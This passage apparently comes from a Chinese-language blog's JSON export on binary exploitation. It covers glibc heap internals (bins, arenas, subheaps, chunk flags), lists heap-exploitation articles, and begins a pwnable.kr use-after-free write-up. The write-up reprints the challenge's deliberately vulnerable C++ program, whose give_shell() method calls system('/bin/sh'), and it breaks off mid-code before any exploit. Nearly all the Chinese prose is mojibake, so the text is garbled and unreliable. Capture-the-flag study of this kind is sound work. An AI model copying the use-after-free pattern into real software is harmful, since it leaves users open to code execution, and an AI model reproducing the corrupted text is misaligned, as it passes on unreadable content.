FREEâ€™D CHUNKS ä»æ¦‚å¿µä¸Šè®²ï¼Œåˆ†é…ä¹‹å‰é‡Šæ”¾çš„å—éå¸¸ç®€å•ã€‚å› ä¸ºå½“ä¸€ä¸ªå—åœ¨å†…å­˜ä¸­è¢«é‡Šæ”¾ï¼Œå †ç®¡ç†å™¨ä¼šåœ¨ä¸€ç³»åˆ—ç§°ä¸ºâ€œbinsâ€çš„ä¸åŒé“¾è¡¨ä¸­è®°å½•è¿™äº›é‡Šæ”¾çš„å—ã€‚ç”¨æˆ·å‘å‡ºä¸€ä¸ªåˆ†é…è¯·æ±‚åï¼Œå †ç®¡ç†å™¨ä¼šåœ¨è¿™äº›â€œbinsâ€ä¸­æœç´¢ä¸€ä¸ªè¶³å¤Ÿå¤§çš„ç©ºé—²å—ï¼Œä¸ºç”¨æˆ·æä¾›æœåŠ¡ã€‚å¦‚æœå¯ä»¥æˆåŠŸæ‰¾åˆ°ä¸€ä¸ªï¼Œåˆ™å°†è¿™ä¸ªç©ºé—²å—ä»ç‰¹å®šçš„binä¸­åˆ é™¤ï¼Œå¹¶æ ‡è®°ä¸ºâ€œå·²åˆ†é…â€ï¼Œç„¶åè¿™ä¸ªæŒ‡å‘è¯¥â€œuser dataâ€åŒºåŸŸå—çš„æŒ‡é’ˆï¼Œä¼šä½œä¸ºmallocçš„è¿”å›å€¼è¿”å›ç»™ç¨‹åºå‘˜ã€‚ å‡ºäºæ€§èƒ½åŸå› ï¼Œæœ‰å‡ ç§ä¸åŒç±»å‹çš„binsï¼Œå³fast bins ã€unsorted bins ã€small binsã€large bins ã€per-thread tcacheã€‚ä¸‹ä¸ªéƒ¨åˆ†å°†è¯¦ç»†è®¨è®ºè¿™äº›ä¸åŒç§ç±»çš„binsã€‚ ALLOCATING FROM THE TOP OF THE HEAP å¦‚æœæ²¡æœ‰å¯ç”¨çš„ç©ºé—²å—å¯ä»¥æ»¡è¶³åˆ†é…è¯·æ±‚ï¼Œåˆ™å †ç®¡ç†å™¨å¿…é¡»ä»å¤´å¼€å§‹æ„é€ ä¸€ä¸ªæ–°å—ã€‚ä¸ºæ­¤ï¼Œå †ç®¡ç†å™¨é¦–å…ˆæŸ¥çœ‹å †é¡¶éƒ¨æ˜¯å¦æœ‰è¶³å¤Ÿçš„å¯ç”¨ç©ºé—´ï¼ˆæœ‰æ—¶ç§°ä¸ºâ€œtop chunkâ€æˆ–â€œremainder chunkâ€ï¼‰ã€‚å¦‚æœå­˜åœ¨ï¼Œå †ç®¡ç†å™¨å°†åœ¨æ­¤å¯ç”¨ç©ºé—´åŸºç¡€ä¸Šæ„é€ ä¸€ä¸ªæ–°å—ã€‚ ASKING THE KERNEL FOR MORE MEMORY AT THE TOP OF THE HEAP ä¸€æ—¦å †é¡¶éƒ¨çš„å¯ç”¨ç©ºé—´ç”¨å®Œï¼Œå †ç®¡ç†å™¨å°†ä¸å¾—ä¸è¦æ±‚å†…æ ¸åœ¨å †çš„æœ«å°¾å¢åŠ æ›´å¤šå†…å­˜ã€‚ åœ¨å»ºç«‹å †çš„å¼€å§‹é˜¶æ®µä¸Šï¼Œå †ç®¡ç†å™¨é€šè¿‡è°ƒç”¨sbrkï¼Œè¦æ±‚å†…æ ¸åœ¨å †æœ«å°¾åˆ†é…æ›´å¤šçš„å†…å­˜ã€‚åœ¨å¤§å¤šæ•°åŸºäºLinuxçš„ç³»ç»Ÿä¸Šï¼Œåœ¨å†…éƒ¨ä½¿ç”¨ç§°ä¸ºâ€œ brk â€çš„ç³»ç»Ÿè°ƒç”¨ã€‚è¿™ä¸ªç³»ç»Ÿè°ƒç”¨çš„åç§°å¾ˆå®¹æ˜“æ··æ·†ï¼Œå®ƒæœ€åˆçš„æ„æ€æ˜¯â€œæ›´æ”¹ç¨‹åºä¸­æ–­ä½ç½®â€ï¼Œé€šä¿—æ¥è¯´ï¼Œå®ƒè¡¨ç¤ºåœ¨ç¨‹åºåŠ è½½åˆ°å†…å­˜ä¹‹åï¼Œè¯¥åŒºåŸŸä¼šå¢åŠ æ›´å¤šçš„å†…å­˜ã€‚å› ä¸ºè¿™æ˜¯å †ç®¡ç†å™¨ä»ä¸€å¼€å§‹åˆ›å»ºå †çš„åœ°æ–¹ï¼Œæ‰€ä»¥æ­¤ç³»ç»Ÿè°ƒç”¨çš„ä½œç”¨æ˜¯åœ¨ç¨‹åºå †çš„æœ«å°¾åˆ†é…æ›´å¤šçš„å†…å­˜ã€‚ æœ€ç»ˆï¼Œå¦‚æœä¸€ç›´ä½¿ç”¨sbrkæ‰©å±•å †ä¼šå¯¼è‡´åˆ†é…å¤±è´¥ï¼Œå› ä¸ºå †ç©ºé—´å¢é•¿å¾—å¤ªå¤§ä¹‹åï¼Œè¿›ä¸€æ­¥æ‰©å±•å°†å¯¼è‡´å…¶ä¸è¿›ç¨‹åœ°å€ç©ºé—´ä¸­çš„å…¶ä»–å†…å®¹å‘ç”Ÿå†²çªï¼Œä¾‹å¦‚å†…å­˜æ˜ å°„ï¼Œå…±äº«åº“æˆ–çº¿ç¨‹çš„å †æ ˆåŒºåŸŸã€‚å› æ­¤sbrkæ— æ³•åˆ†é…æ—¶ï¼Œå †ç®¡ç†å™¨å°†ä½¿ç”¨mmapè°ƒç”¨å°†æ–°çš„éè¿ç»­å†…å­˜é™„åŠ åˆ°åˆå§‹ç¨‹åºå †ã€‚ å¦‚æœmmapä¹Ÿå¤±è´¥ï¼Œåˆ™è¯¥è¿›ç¨‹æ ¹æœ¬æ— æ³•åˆ†é…æ›´å¤šçš„å†…å­˜ï¼Œå¹¶ä¸”mallocå°†è¿”å›NULLã€‚ OFF-HEAP ALLOCATIONS VIA MMAPå¾ˆå¤§çš„åˆ†é…è¯·æ±‚ï¼ˆè¶…è¿‡æŸä¸ªé˜ˆå€¼*ï¼‰åœ¨å †ç®¡ç†å™¨ä¸­ä¼šå¾—åˆ°ç‰¹æ®Šå¤„ç†ã€‚é€šè¿‡ç›´æ¥è°ƒç”¨mmapå¯ä»¥åœ¨å †å¤–åˆ†é…è¿™äº›å¤§å—ï¼Œå¹¶ä½¿ç”¨å—ä¸­å…ƒæ•°æ®çš„æ ‡è®°ä½æ¥æ ‡è®°è¿™ä¸€äº‹å®ã€‚å½“è¿™äº›å·¨å¤§å—é€šè¿‡è°ƒç”¨freeé‡Šæ”¾åˆ°å †ç®¡ç†å™¨æ—¶ï¼Œå †ç®¡ç†å™¨å°†é€šè¿‡munmapå°†æ•´ä¸ªmmap è¿‡çš„åŒºåŸŸè¿”è¿˜ç»™ç³»ç»Ÿã€‚ *é»˜è®¤æƒ…å†µä¸‹ï¼Œæ­¤é˜ˆå€¼ åœ¨32ä½ç³»ç»Ÿä¸Šä¸º128KB~512KBï¼Œåœ¨64ä½ç³»ç»Ÿä¸Šä¸º32MBï¼Œä½†æ˜¯ï¼Œå¦‚æœå †ç®¡ç†å™¨æ£€æµ‹åˆ°è¿™äº›åˆ†é…çš„å¤§å—å†…å­˜åªéœ€è¦è¢«ä¸´æ—¶ä½¿ç”¨ï¼Œåˆ™æ­¤é˜ˆå€¼ä¹Ÿä¼šåŠ¨æ€å¢åŠ ã€‚ ARENASåœ¨å¤šçº¿ç¨‹åº”ç”¨ç¨‹åºä¸Šï¼Œå †ç®¡ç†å™¨éœ€è¦ä¿æŠ¤å†…éƒ¨å †æ•°æ®ç»“æ„å…å—å¯èƒ½å¯¼è‡´ç¨‹åºå´©æºƒçš„ç«äº‰æ¡ä»¶çš„å½±å“ã€‚åœ¨ptmalloc2ä¹‹å‰ï¼Œå †ç®¡ç†å™¨é€šè¿‡åœ¨æ¯æ¬¡å †æ“ä½œä¹‹å‰ç®€å•åœ°ä½¿ç”¨å…¨å±€äº’æ–¥é”ï¼Œä»¥ç¡®ä¿åœ¨ä»»ä½•ç»™å®šæ—¶é—´åªæœ‰ä¸€ä¸ªçº¿ç¨‹å¯ä»¥ä¸å †è¿›è¡Œäº¤äº’ã€‚ å°½ç®¡æ­¤ç­–ç•¥æœ‰æ•ˆï¼Œä½†å †åˆ†é…å™¨å¯¹é«˜åˆ©ç”¨ç‡å’Œæ€§èƒ½éå¸¸æ•æ„Ÿï¼Œä»¥è‡³äºå¯¼è‡´ä½¿ç”¨å¤§é‡çº¿ç¨‹çš„åº”ç”¨ç¨‹åºå‡ºç°ä¸¥é‡çš„æ€§èƒ½é—®é¢˜ã€‚ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œptmalloc2å †åˆ†é…å™¨å¼•å…¥äº†â€œarenasâ€çš„æ¦‚å¿µã€‚æ¯ä¸ªâ€œarenasâ€æœ¬è´¨ä¸Šæ˜¯ä¸€ä¸ªå®Œå…¨ä¸åŒçš„å †ï¼Œå®ƒå®Œå…¨ç‹¬ç«‹åœ°ç®¡ç†è‡ªå·±çš„å—åˆ†é…å’Œfree binsã€‚æ¯ä¸ªâ€œarenasâ€ä»ç„¶ä½¿ç”¨äº’æ–¥é”æ¥åºåˆ—åŒ–ä¸åŒçº¿ç¨‹å¯¹å†…éƒ¨æ•°æ®ç»“æ„çš„è®¿é—®ï¼Œä½†æ˜¯åªè¦çº¿ç¨‹ä¸ä¸åŒçš„â€œarenasâ€è¿›è¡Œäº¤äº’ï¼Œçº¿ç¨‹å°±å¯ä»¥å®‰å…¨åœ°æ‰§è¡Œå †æ“ä½œè€Œä¸ä¼šå½¼æ­¤åœé¡¿ã€‚ ç¨‹åºçš„åˆå§‹ï¼ˆâ€œmainâ€ï¼‰â€œarenasâ€ä»…åŒ…å«æˆ‘ä»¬å·²ç»çœ‹åˆ°çš„å †ï¼Œå¯¹äºå•çº¿ç¨‹åº”ç”¨ç¨‹åºï¼Œè¿™æ˜¯å †ç®¡ç†å™¨å°†ä½¿ç”¨çš„å”¯ä¸€arenaã€‚ä½†æ˜¯ï¼Œéšç€æ–°çº¿ç¨‹åŠ å…¥è¯¥è¿›ç¨‹ï¼Œå †ç®¡ç†å™¨ä¼šä¸ºæ¯ä¸ªæ–°çº¿ç¨‹åˆ†é…å¹¶é™„åŠ â€œarenasâ€ï¼Œä»¥å‡å°‘mallocå’Œfreeç­‰æ“ä½œçš„ç­‰å¾…æ—¶é—´ã€‚ å¯¹äºæ¯ä¸ªåŠ å…¥è¯¥è¿›ç¨‹çš„æ–°çº¿ç¨‹ï¼Œå †ç®¡ç†å™¨å°†å…ˆæŸ¥æ‰¾æ²¡æœ‰è¢«å…¶ä»–çº¿ç¨‹åœ¨ä½¿ç”¨çš„â€œarenasâ€ï¼Œå¹¶å°†è¯¥â€œarenasâ€é™„åŠ åˆ°è¯¥çº¿ç¨‹ã€‚ä¸€æ—¦æ‰€æœ‰å¯ç”¨çš„â€œarenasâ€éƒ½æ˜¯åœ¨å…¶å®ƒçº¿ç¨‹ä½¿ç”¨ä¸­ï¼Œå †ç®¡ç†å™¨å°†åˆ›å»ºä¸€ä¸ªæ–°çš„â€œarenasâ€ï¼Œç›´åˆ°â€œarenasâ€çš„æ•°ç›®è¾¾åˆ°æœ€å¤§ï¼ˆ32ä½è¿›ç¨‹ä¸ºCPUæ ¸å¿ƒæ•°çš„2å€ã€64ä½è¿›ç¨‹ä½CPUæ ¸å¿ƒçš„8å€ï¼‰ã€‚ä¸€æ—¦æœ€ç»ˆè¾¾åˆ°è¯¥é™åˆ¶ï¼Œå †ç®¡ç†å™¨å°±ä¼šæ”¾å¼ƒåˆ†é…ï¼Œè¿™æ ·å¤šä¸ªçº¿ç¨‹å°†å¿…é¡»å…±äº«ä¸€ä¸ªâ€œarenasâ€ï¼Œå³æ‰§è¡Œå †æ“ä½œå°†éœ€è¦é‚£äº›çº¿ç¨‹ä¸­çš„ä¸€ä¸ªç­‰å¾…å¦ä¸€ä¸ªçº¿ç¨‹ã€‚ ä½†æ˜¯è¿™äº›äºŒçº§â€œarenasâ€å¦‚ä½•å·¥ä½œï¼Ÿæˆ‘ä»¬çœ‹åˆ°ï¼Œä¸»å †åœ¨ç¨‹åºåŠ è½½åˆ°å†…å­˜çš„ç´§é‚»å…¶åçš„ä½ç½®ï¼Œå¹¶ä½¿ç”¨brkç³»ç»Ÿè°ƒç”¨å¯¹å…¶è¿›è¡Œæ‰©å±•å¼€å§‹å·¥ä½œï¼Œä½†äºŒçº§â€œarenasâ€å¹¶ä¸ç›¸åŒï¼Œè¿™äº›äºŒçº§â€œarenasâ€ä½¿ç”¨mmapå’Œmprotectåˆ›å»ºçš„ä¸€ä¸ªæˆ–å¤šä¸ªâ€œå­å †â€æ¥æ¨¡æ‹Ÿä¸»å †çš„è¡Œä¸ºã€‚ SUBHEAPS å­å †çš„å·¥ä½œæ–¹å¼ä¸åˆå§‹ç¨‹åºå †åŸºæœ¬ç›¸åŒï¼Œä¸»è¦å­˜åœ¨ä¸¤ä¸ªåŒºåˆ«ã€‚åˆå§‹å †ä½äºç¨‹åºåŠ è½½åˆ°å†…å­˜ä¹‹åçš„ç´§é‚»å…¶åçš„ä½ç½®ï¼Œå¹¶ä¸”ç”±sbrkåŠ¨æ€æ‰©å±•ã€‚ç›¸æ¯”ä¹‹ä¸‹ï¼Œæ¯ä¸ªå­å †ä½¿ç”¨mmapå®šä½åˆ°å†…å­˜ä¸­ï¼Œå †ç®¡ç†å™¨ä½¿ç”¨mprotectæ‰‹åŠ¨æ¨¡æ‹Ÿå¢é•¿å­å †ã€‚ å½“å †ç®¡ç†å™¨æƒ³è¦åˆ›å»ºå­å †æ—¶ï¼Œå®ƒé¦–å…ˆé€šè¿‡è°ƒç”¨mmapè¦æ±‚å†…æ ¸ä¿ç•™è¯¥å­å †å¯èƒ½å¢é•¿åˆ°çš„å†…å­˜åŒºåŸŸã€‚ä¿ç•™è¯¥åŒºåŸŸä¸ä¼šå°†å†…å­˜ç›´æ¥åˆ†é…åˆ°å­å †ä¸­ï¼›å®ƒåªæ˜¯è¦æ±‚å†…æ ¸ä¸è¦åœ¨è¯¥åŒºåŸŸå†…åˆ†é…è¯¸å¦‚çº¿ç¨‹å †æ ˆï¼ŒmmapåŒºåŸŸæˆ–è€…å…¶å®ƒçš„åˆ†é…ä»»åŠ¡ã€‚*é»˜è®¤æƒ…å†µä¸‹ï¼Œå­å †å¤§å°æœ€å¤§ï¼ˆå³ä¿ç•™è¯¥å­å †ä½¿ç”¨çš„å†…å­˜åŒºåŸŸï¼‰åœ¨32ä½ä¸Šä¸º1MBï¼Œåœ¨64ä½ç³»ç»Ÿä¸Šä¸º64MBã€‚ è¿™æ˜¯é€šè¿‡mmapè¯¢é—®æ ‡è®°ä¸ºPROT_NONEçš„é¡µé¢æ¥å®Œæˆçš„ï¼Œè¿™è¡¨æ˜å†…æ ¸ä»…éœ€è¦ä¸ºè¯¥åŒºåŸŸä¿ç•™åœ°å€èŒƒå›´ï¼Œä¸éœ€è¦å†…æ ¸å°†å†…å­˜ç›´æ¥åˆ†é…ç»™å®ƒã€‚ åœ¨ä½¿ç”¨sbrkå¢é•¿åˆå§‹å †çš„åœ°æ–¹ï¼Œå †ç®¡ç†å™¨é€šè¿‡æ‰‹åŠ¨è°ƒç”¨mprotectå°†åŒºåŸŸä¸­çš„é¡µé¢ä»PROT_NONEæ›´æ”¹ä¸ºPROT_READ | PROT_WRITEæ¥å°†å­å †â€œå¢é•¿â€åˆ°æ­¤ä¿ç•™çš„åœ°å€èŒƒå›´ã€‚è¿™å¯¼è‡´å†…æ ¸å°†ç‰©ç†å†…å­˜é™„åŠ åˆ°é‚£äº›åœ°å€ï¼Œå®é™…ä¸Šä¹Ÿä¼šå¯¼è‡´å­å †ç¼“æ…¢å¢é•¿ï¼Œç›´åˆ°æ•´ä¸ªmmapåŒºåŸŸå·²æ»¡ã€‚ä¸€æ—¦æ•´ä¸ªå­å †éƒ½ç”¨å®Œï¼Œarenasä¾¿ä¼šåˆ†é…å¦ä¸€ä¸ªå­å †ã€‚è¿™å°†å…è®¸äºŒçº§â€arenasâ€å‡ ä¹æ— é™æœŸåœ°ä¿æŒå¢é•¿ï¼Œç›´åˆ°å†…æ ¸è€—å°½å†…å­˜æˆ–è¿›ç¨‹è€—å°½åœ°å€ç©ºé—´æ—¶æ‰ä¼šå¤±è´¥ã€‚ Recapï¼šåˆå§‹ï¼ˆâ€œmainâ€ï¼‰arenaä»…åŒ…å«ä¸»å †ï¼Œè¯¥ä¸»å †ä½äºå°†ç¨‹åºäºŒè¿›åˆ¶æ–‡ä»¶åŠ è½½åˆ°å†…å­˜ä¹‹åçš„ä½ç½®ï¼Œå¹¶ä½¿ç”¨sbrkè¿›è¡Œæ‰©å±•ã€‚è¿™æ˜¯ç”¨äºå•çº¿ç¨‹åº”ç”¨ç¨‹åºçš„å”¯ä¸€arenaã€‚åœ¨å¤šçº¿ç¨‹åº”ç”¨ç¨‹åºä¸Šï¼Œä¸ºæ–°çº¿ç¨‹åˆ†é…äº†äºŒçº§arenaï¼Œä»ä¸­å¯ä»¥åˆ†é…è¿™äº›äºŒçº§arenaã€‚ä½¿ç”¨arenaså¯ä»¥é™ä½çº¿ç¨‹åœ¨æ‰§è¡Œå †æ“ä½œä¹‹å‰éœ€è¦ç­‰å¾…äº’æ–¥é”çš„å¯èƒ½æ€§ï¼Œä»è€Œæé«˜äº†ç¨‹åºçš„é€Ÿåº¦ã€‚ä¸main arenaä¸åŒï¼Œè¿™äº›äºŒçº§arenaä»ä¸€ä¸ªæˆ–å¤šä¸ªå­å †ä¸­åˆ†é…å—ï¼Œè¿™äº›å­å †åœ¨å†…å­˜ä¸­çš„ä½ç½®é¦–å…ˆä½¿ç”¨mmapè¿›è¡Œç¡®å®šï¼Œå¹¶é€šè¿‡ä½¿ç”¨mprotectè¿›è¡Œæ‰©å±•ã€‚ CHUNK METADATAç°åœ¨ï¼Œäº†è§£äº†åˆ†é…å—çš„æ‰€æœ‰ä¸åŒæ–¹å¼ï¼Œè¿™äº›å—ä¸ä»…åŒ…å«æä¾›ç»™ç¨‹åºå‘˜çš„â€œç”¨æˆ·æ•°æ®â€åŒºåŸŸï¼ˆä½œä¸ºmallocçš„è¿”å›å€¼ï¼‰ï¼ŒåŒæ—¶åŒ…å«å…ƒæ•°æ®ã€‚ä¸‹é¢ä»‹ç»å…ƒæ•°æ®å®é™…è®°å½•çš„å€¼ä»¥åŠå­˜æ”¾çš„ä½ç½®ã€‚ å—çš„å…ƒæ•°æ®åœ¨å†…å­˜ä¸­çš„ç¡®åˆ‡å¸ƒå±€å¯èƒ½ä¼šå¾ˆæ··ä¹±ï¼Œå› ä¸ºå †ç®¡ç†å™¨æºä»£ç å°†ä¸€ä¸ªå—æœ«å°¾çš„å…ƒæ•°æ®ä¸ä¸‹ä¸€ä¸ªå—æœ«å°¾çš„å…ƒæ•°æ®ç»„åˆåœ¨ä¸€èµ·ï¼Œå¹¶ä¸”å‡ ä¸ªå­˜åœ¨å¹¶è¢«ä½¿ç”¨çš„å…ƒæ•°æ®å­—æ®µå–å†³äºä¸åŒç§ç±»çš„chunkã€‚ ç°åœ¨ï¼Œæˆ‘ä»¬ä»…çœ‹ä¸€ä¸‹å®æ—¶åˆ†é…ï¼Œå®ƒå…·æœ‰å•ä¸ªsize_t * æ ‡å¤´ï¼Œè¯¥æ ‡å¤´ä½äºç»™ç¨‹åºå‘˜çš„â€œç”¨æˆ·æ•°æ®â€åŒºåŸŸçš„åé¢ã€‚æ­¤å­—æ®µï¼ˆåœ¨æºä»£ç ä¸­ç§°ä¸ºmchunk_sizeï¼‰æ˜¯åœ¨mallocæœŸé—´å†™å…¥çš„ï¼Œä¹‹åç”±freeå†³å®šå¦‚ä½•å¤„ç†è¯¥åˆ†é…ç©ºé—´çš„é‡Šæ”¾ã€‚ * size_tå€¼åœ¨32ä½ç³»ç»Ÿä¸Šä¸º4å­—èŠ‚æ•´æ•°ï¼Œåœ¨64ä½ç³»ç»Ÿä¸Šä¸º8å­—èŠ‚æ•´æ•°ã€‚ è¯¥mchunk_sizeå­˜å‚¨äº†å››ç§ä¿¡æ¯ï¼šå—çš„å¤§å°ï¼Œä»¥åŠè¢«ç§°ä¸ºâ€œAâ€,â€œMâ€å’Œâ€œPâ€ä¸‰æ¯”ç‰¹ä½ã€‚è¿™äº›éƒ½è¢«å­˜å‚¨åœ¨ç›¸åŒçš„size_tå­—æ®µä¸­ï¼Œå› ä¸ºå—å¤§å°å§‹ç»ˆæ˜¯8å­—èŠ‚å¯¹é½çš„ï¼ˆåœ¨64ä½ä¸Šæ˜¯16å­—èŠ‚å¯¹é½ï¼‰ï¼Œå› æ­¤ï¼Œå—å¤§å°çš„ä½ä¸‰ä½å§‹ç»ˆä¸ºé›¶ã€‚ â€œ A â€æ ‡å¿—æ˜¯ç”¨æ¥å‘Šè¯‰å †ç®¡ç†å™¨ï¼Œæ˜¯å¦è¯¥å—å±äºäºŒçº§arenaï¼Œè€Œä¸æ˜¯åœ¨main arenaã€‚åœ¨freeæœŸé—´ï¼Œå †ç®¡ç†å™¨ä»…ä»…ç»™äº†ä¸€ä¸ªæŒ‡å‘ç¨‹åºå‘˜æƒ³è¦é‡Šæ”¾ç©ºé—´çš„æŒ‡é’ˆï¼Œå¹¶ä¸”å †ç®¡ç†å™¨éœ€è¦ç¡®å®šè¯¥æŒ‡é’ˆå±äºå“ªä¸€ä¸ªarenaã€‚å¦‚æœåœ¨å—çš„å…ƒæ•°æ®ä¸­Aæ ‡å¿—è¢«è®¾ç½®ï¼Œåˆ™å †ç®¡ç†å™¨å¿…é¡»æœç´¢æ¯ä¸ªarenaï¼Œå¹¶æŸ¥çœ‹æŒ‡é’ˆæ˜¯å¦ä½äºè¯¥arenaçš„ä»»ä½•å­å †ä¸­ã€‚å¦‚æœæœªè®¾ç½®è¯¥æ ‡å¿—ï¼Œåˆ™å †ç®¡ç†å™¨å¯ä»¥å‡å°‘æœç´¢ï¼Œå› ä¸ºå®ƒçŸ¥é“è¯¥å—æ¥è‡ªåˆå§‹çš„arenaã€‚ â€œ M â€æ ‡å¿—ç”¨äºæŒ‡ç¤ºè¯¥å—æ˜¯ä¸€ä¸ªé€šè¿‡mmapè¿›è¡Œå †å¤–åˆ†é…çš„å·¨å¤§åˆ†é…ã€‚å½“æ­¤åˆ†é…ç©ºé—´æœ€ç»ˆè¿”å›ç»™freeæ—¶ï¼Œå †ç®¡ç†å™¨å°†é€šè¿‡munmapç«‹å³å°†æ•´ä¸ªå—è¿”å›ç»™æ“ä½œç³»ç»Ÿï¼Œè€Œä¸æ˜¯å°è¯•å¯¹å…¶è¿›è¡Œå›æ”¶ã€‚å› æ­¤ï¼Œç©ºé—²å³å·²ç»è¢«é‡Šæ”¾çš„å—æ°¸è¿œä¸ä¼šè®¾ç½®è¯¥æ ‡å¿—ä½ã€‚ â€œ P â€æ ‡å¿—ä»¤äººå›°æƒ‘ï¼Œå› ä¸ºå®ƒå®é™…ä¸Šå±äºå…ˆå‰çš„å—ã€‚å®ƒæŒ‡ç¤ºå…ˆå‰çš„å—æ˜¯ä¸€ä¸ªç©ºé—²å—ã€‚è¿™æ„å‘³ç€å½“è¿™ä¸ªå—è¢«é‡Šæ”¾æ—¶ï¼Œå¯ä»¥å°†å…¶å®‰å…¨åœ°è¿æ¥åˆ°å…ˆå‰çš„å—ä¸Šï¼Œä»¥åˆ›å»ºæ›´å¤§çš„ç©ºé—²å—ã€‚ ä¸‹é¢æ˜¯ä¸€äº›å’Œå †ç›¸å…³çš„æ–‡ç« ï¼š Once upon a free() Malloc des-maleficarum The house of lore Advanced Doug Leaâ€™s malloc exploits Yet another free() exploitation technique","categories":[{"name":"PWN","slug":"PWN","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/"},{"name":"Heap","slug":"PWN/Heap","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/Heap/"},{"name":"Heap_Basic","slug":"PWN/Heap/Heap-Basic","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/Heap/Heap-Basic/"}],"tags":[{"name":"PWN","slug":"PWN","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/tags/PWN/"}]},{"title":"uaf","slug":"Pwnable_kr/uaf","date":"2020-10-16T02:26:47.000Z","updated":"2020-10-19T07:10:20.000Z","comments":true,"path":"2020/10/16/Pwnable_kr/uaf/","link":"","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/2020/10/16/Pwnable_kr/uaf/","excerpt":"","text":"æŸ¥çœ‹uaf.cppæ–‡ä»¶æºä»£ç 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778#include &lt;fcntl.h&gt;#include &lt;iostream&gt;#include &lt;cstring&gt;#include &lt;cstdlib&gt;#include &lt;unistd.h&gt;using namespace std;class Human&#123;private: virtual void give_shell()&#123; system(&quot;/bin/sh&quot;); &#125;protected: int age; string name;public: virtual void introduce()&#123; cout &lt;&lt; &quot;My name is &quot; &lt;&lt; name &lt;&lt; endl; cout &lt;&lt; &quot;I am &quot; &lt;&lt; age &lt;&lt; &quot; years old&quot; &lt;&lt; endl; &#125;&#125;;class Man: public Human&#123;public: Man(string name, int age)&#123; this-&gt;name = name; this-&gt;age = age; &#125; virtual void introduce()&#123; Human::introduce(); cout &lt;&lt; &quot;I am a nice guy!&quot; &lt;&lt; endl; &#125;&#125;;class Woman: public Human&#123;public: Woman(string name, int age)&#123; this-&gt;name = name; this-&gt;age = age; &#125; virtual void introduce()&#123; Human::introduce(); cout &lt;&lt; &quot;I am a cute girl!&quot; &lt;&lt; endl; &#125;&#125;;int main(int argc, char* argv[])&#123; Human* m = new Man(&quot;Jack&quot;, 25); Human* w = new Woman(&quot;Jill&quot;, 21); size_t len; char* data; unsigned int op; while(1)&#123; cout &lt;&lt; &quot;1. use\\n2. after\\n3. free\\n&quot;; cin &gt;&gt; op; switch(op)&#123; case 1: m-&gt;introduce(); w-&gt;introduce(); break; case 2: len = atoi(argv[1]); data = new char[len]; read(open(argv[2], O_RDONLY), data, len); cout &lt;&lt; &quot;your data is allocated&quot; &lt;&lt; endl; break; case 3: delete m; delete w; break; default: break; &#125; &#125; return 0;&#125; ç¨‹åºå®šä¹‰ä¸€ä¸ªåä¸ºhumançš„è™šåŸºç±»ï¼Œä¹‹åå®šä¹‰äº†Manå’ŒWomanä¸¤ä¸ªç±»ç»§æ‰¿è¿™ä¸ªç±»ï¼Œå¹¶å„è‡ªé‡å†™äº†çˆ¶ç±»çš„introduce()æ–¹æ³•ï¼Œä¸»å‡½æ•°ä¸­ï¼Œåˆ†åˆ«åˆ›å»ºäº†ä¸€ä¸ªManå’ŒWomançš„å¯¹è±¡, ç”¨æˆ·å¯ä»¥è¾“å…¥ä¸‰ä¸ªé€‰é¡¹ï¼Œåˆ†åˆ«ä¸ºï¼š useï¼šManå’ŒWomanåˆ†åˆ«è°ƒç”¨introduce()æ–¹æ³•ï¼Œå³ä½¿ç”¨æŒ‡é’ˆæŒ‡å‘çš„å‡½æ•° afterï¼šåˆ†é…ä¸€æ®µåœ°å€ç©ºé—´å­˜å‚¨mainå‡½æ•°ä¼ é€’çš„æ•°æ®ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨å…¶å°†å·²ç»è¢«freeçš„å†…å­˜ï¼Œé‡æ–°allocate freeï¼šdeleteé‡Šæ”¾æ‰åˆ›å»ºçš„å¯¹è±¡çš„ç©ºé—´ï¼Œå³å°†æŒ‡é’ˆæŒ‡å‘çš„å†…å­˜é‡Šæ”¾ ä¸‰è€…çš„ç»„åˆå³å¯æ„æˆUAFæ¼æ´ èƒŒæ™¯çŸ¥è¯†å‰ç½®çŸ¥è¯†1ï¼šè™šå‡½æ•°çš„å†…å­˜åœ°å€ç©ºé—´åœ¨C++ä¸­ï¼Œå¦‚æœç±»ä¸­æœ‰è™šå‡½æ•°ï¼Œé‚£ä¹ˆå®ƒå°±ä¼šæœ‰ä¸€ä¸ªè™šå‡½æ•°è¡¨çš„æŒ‡é’ˆ__vfptrï¼Œåœ¨ç±»å¯¹è±¡æœ€å¼€å§‹çš„å†…å­˜æ•°æ®ä¸­ã€‚ä¹‹åæ˜¯ç±»ä¸­çš„æˆå‘˜å˜é‡çš„å†…å­˜æ•°æ®ã€‚å¯¹äºå­ç±»ï¼Œæœ€å¼€å§‹çš„å†…å­˜æ•°æ®è®°å½•ç€çˆ¶ç±»å¯¹è±¡çš„æ‹·è´ï¼ˆåŒ…æ‹¬çˆ¶ç±»è™šå‡½æ•°è¡¨æŒ‡é’ˆå’Œæˆå‘˜å˜é‡ï¼‰ã€‚ ä¹‹åæ˜¯å­ç±»è‡ªå·±çš„æˆå‘˜å˜é‡æ•°æ®ã€‚ 1234567891011121314151617181920212223242526272829303132class Base &#123; public: virtual void f() &#123; cout &lt;&lt; &quot;Base::f&quot; &lt;&lt; endl; &#125; virtual void g() &#123; cout &lt;&lt; &quot;Base::g&quot; &lt;&lt; endl; &#125; virtual void h() &#123; cout &lt;&lt; &quot;Base::h&quot; &lt;&lt; endl; &#125; int base; protected: private: &#125;; //å­ç±»1ï¼Œæ— è™šå‡½æ•°é‡è½½ class Child1 : public Base &#123; public: virtual void f1() &#123; cout &lt;&lt; &quot;Child1::f1&quot; &lt;&lt; endl; &#125; virtual void g1() &#123; cout &lt;&lt; &quot;Child1::g1&quot; &lt;&lt; endl; &#125; virtual void h1() &#123; cout &lt;&lt; &quot;Child1::h1&quot; &lt;&lt; endl; &#125; int child1; protected: private: &#125;; //å­ç±»2ï¼Œæœ‰1ä¸ªè™šå‡½æ•°é‡è½½ class Child2 : public Base &#123; public: virtual void f() &#123; cout &lt;&lt; &quot;Child2::f&quot; &lt;&lt; endl; &#125; virtual void g2() &#123; cout &lt;&lt; &quot;Child2::g2&quot; &lt;&lt; endl; &#125; virtual void h2() &#123; 